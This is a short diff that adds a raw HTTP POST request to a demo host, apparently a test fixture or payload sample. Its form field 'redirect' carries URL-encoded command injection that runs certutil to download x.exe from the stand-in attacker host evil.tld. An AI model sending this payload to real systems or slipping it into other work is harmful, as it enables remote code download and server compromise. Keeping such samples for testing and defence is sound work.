@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Connection: close
+
+redirect=%3B+certutil+-urlcache+-f+http%3A%2F%2Fevil.tld%2Fx.exe+x.exe
